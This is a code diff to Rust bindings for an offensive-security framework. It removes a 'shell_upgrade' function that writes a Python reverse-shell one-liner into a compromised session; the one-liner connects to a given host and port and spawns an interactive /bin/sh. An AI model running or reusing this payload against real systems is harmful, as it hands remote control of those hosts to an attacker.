@@ -569,7 +569,6 @@ fn register_session_api(_ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), E
     session.define_module_function("interact", magnus::function!(session_interact, 1))?;
     session.define_module_function("write", magnus::function!(session_write, 2))?;
     session.define_module_function("read", magnus::function!(session_read_output, 1))?;
-    session.define_module_function("shell_upgrade", magnus::function!(session_shell_upgrade, 3))?;
 
     Ok(())
 }
@@ -1057,24 +1056,6 @@ fn session_write(ruby: &Ruby, session_id: String, command: String) -> Result<Str
 #[cfg(feature = "ruby-plugins")]
 fn session_read_output(ruby: &Ruby, session_id: String) -> Result<String, Error> {
     msf_session_read(ruby, session_id)
-}
-
-#[cfg(feature = "ruby-plugins")]
-fn session_shell_upgrade(ruby: &Ruby, session_id: String, lhost: String, lport: String) -> Result<bool, Error> {
-    // Validate lhost as a valid IP or hostname
-    if lhost.is_empty() || lhost.contains(|c: char| !c.is_alphanumeric() && c != '.' && c != '-' && c != ':') {
-        return Err(runtime_error(ruby, "Invalid lhost: must be a valid IP address or hostname"));
-    }
-    // Validate lport as a valid u16
-    let port: u16 = lport
-        .parse()
-        .map_err(|_| runtime_error(ruby, "Invalid lport: must be a number between 1 and 65535"))?;
-    if port == 0 {
-        return Err(runtime_error(ruby, "Invalid lport: must be between 1 and 65535"));
-    }
-    let command = format!("python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"", lhost, port);
-    msf_session_write(ruby, session_id, command)?;
-    Ok(true)
 }
 
 pub struct SlapperApi;
